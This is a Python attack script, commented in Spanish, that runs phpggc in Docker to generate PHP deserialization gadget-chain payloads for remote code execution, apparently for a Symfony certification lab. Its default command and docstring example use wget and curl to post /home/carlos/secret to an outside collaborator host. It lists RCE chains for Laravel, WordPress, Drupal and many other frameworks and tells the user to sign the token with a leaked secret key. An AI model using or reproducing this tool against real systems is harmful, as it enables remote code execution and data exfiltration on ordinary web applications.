#!/usr/bin/env python3
r"""
gen_rce_oast.py - Genera un gadget chain de PHP con phpggc.

Editas 2 variables (CHAIN y COMMAND) y corres:  python gen_rce_oast.py
El comando por defecto LEE un archivo y lo exfiltra a tu Collaborator (oastify),
que es lo que pide el examen (Stage 3). Cambia COMMAND por lo que necesites.

Overrides opcionales por CLI:
    python gen_rce_oast.py -c Laravel/RCE13 --cmd "curl --data-binary @/home/carlos/secret https://x.oastify.com"
    python gen_rce_oast.py --list Symfony        # ver cadenas de un framework

Necesita Docker (corre phpggc en un contenedor php-cli).

FIRMA (lab Symfony): lo que sale es el TOKEN; firmalo con sign-cookie.ps1
usando la SECRET_KEY filtrada (phpinfo).
"""

# ============================================================================
#                                  CONFIG  (editá y corré sin argumentos)
# ============================================================================

CHAIN   = "Symfony/RCE4"            # cadena de gadgets (ver VARIANTS abajo o --list)
FUNC    = "exec"                    # función PHP que corre el comando (exec/system/passthru/shell_exec)

# El comando de shell que se ejecuta en la víctima. Al vuelo: escribí acá lo que quieras.
# (pensado para LEER/exfiltrar, no borrar). Poné tu dominio oastify:
COMMAND = "wget https://TU-COLLAB.oastify.com --post-file=/home/carlos/secret"

ENC_FLAG  = "-b"                    # -b base64 | -u urlencode | -a ascii-safe | "" crudo
PHP_IMAGE = "php:8.2-cli"           # imagen Docker con phpggc

# ============================================================================
#  VARIANTES de cadena (por si el target NO es Symfony). En este repo local hay:
#    Symfony/RCE1..16   <- el examen usa Symfony/RCE4
#    Laravel/RCE1..22 · Monolog/RCE1..9 · CodeIgniter4/RCE1..6 · ThinkPHP/RCE1..4
#    ZendFramework/RCE1..5 · Yii/RCE1-2 · Yii2/RCE1-2 · Sulu/RCE1-3 · Spiral/RCE1-2
#    OpenCart/RCE1-2 · CakePHP/RCE1-2 · Doctrine/RCE1-2 · WordPress/RCE1-2
#    Guzzle/RCE1 · Slim/RCE1 · Phalcon/RCE1 · Plates/RCE1 · Drupal/RCE1 · Drupal7/RCE1
#    Horde/RCE1 · MediaWiki/RCE1 · PHPSecLib/RCE1 · vBulletin/RCE1
#    Lectura directa de archivo (sin RCE): CodeIgniter4/FR1 · Kohana/FR1 · SwiftMailer/FR1
#    Lista completa de un framework:  python gen_rce_oast.py --list Symfony
# ============================================================================

import os
import sys
import time
import argparse
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
PHPGGC_DIR = os.path.join(HERE, "phpggc")
DOCKER_DESKTOP = r"C:\Program Files\Docker\Docker\Docker Desktop.exe"


def docker_ok() -> bool:
    return subprocess.run(
        ["docker", "info"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode == 0


def ensure_docker() -> bool:
    if docker_ok():
        return True
    print("[*] Docker no responde. Levantando Docker Desktop...")
    try:
        subprocess.Popen([DOCKER_DESKTOP])
    except FileNotFoundError:
        pass
    print("[*] Esperando a que arranque el engine...")
    for _ in range(60):
        time.sleep(2)
        if docker_ok():
            return True
    return False


def run_phpggc(args_list):
    """Corre phpggc dentro del contenedor y devuelve stdout (o aborta con el error)."""
    if not os.path.isdir(PHPGGC_DIR):
        sys.exit(f"[!] No encuentro phpggc en: {PHPGGC_DIR}")
    cmd = ["docker", "run", "--rm", "-v", f"{PHPGGC_DIR}:/phpggc", "-w", "/phpggc",
           PHP_IMAGE, "php", "phpggc", *args_list]
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        sys.exit("[!] phpggc falló:\n" + (proc.stderr.strip() or proc.stdout.strip()))
    return proc.stdout.strip()


def copy_to_clipboard(text: str) -> None:
    try:
        subprocess.run(["clip"], input=text, text=True, check=False)
    except Exception:
        pass


def main() -> int:
    ap = argparse.ArgumentParser(description="phpggc -> gadget PHP (por defecto: leer/exfiltrar por OAST).")
    ap.add_argument("-c", "--chain", default=CHAIN, help=f"Cadena (def: {CHAIN})")
    ap.add_argument("--func", default=FUNC, help=f"Función PHP (def: {FUNC})")
    ap.add_argument("--cmd", default=COMMAND, help="Comando de shell exacto (def: el del CONFIG)")
    ap.add_argument("-b", dest="enc", action="store_const", const="-b", help="base64 (def)")
    ap.add_argument("-u", dest="enc", action="store_const", const="-u", help="urlencode")
    ap.add_argument("-a", dest="enc", action="store_const", const="-a", help="ascii-safe")
    ap.add_argument("--list", metavar="FRAMEWORK", default=None, help="Lista cadenas de un framework y sale")
    args = ap.parse_args()

    if not ensure_docker():
        print("[X] Docker no arrancó. Abrí Docker Desktop a mano y volvé a correr.")
        return 1
    print(f"[+] Docker OK  (imagen: {PHP_IMAGE})")

    if args.list:
        print(run_phpggc(["-l", args.list]))
        return 0

    enc = args.enc or (ENC_FLAG or None)
    print(f"[*] Cadena : {args.chain}")
    print(f"[*] Comando: {args.cmd}\n")

    phpggc_args = [args.chain, args.func, args.cmd] + ([enc] if enc else [])
    payload = run_phpggc(phpggc_args)
    if not payload:
        print("[X] phpggc no devolvió payload.")
        return 1

    print("=================== PAYLOAD (token) ===================")
    print(payload)
    print("======================================================")
    copy_to_clipboard(payload)
    print("[+] Copiado al portapapeles")
    print("[i] Lab Symfony: firmá el token con sign-cookie.ps1 (SECRET_KEY del phpinfo).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
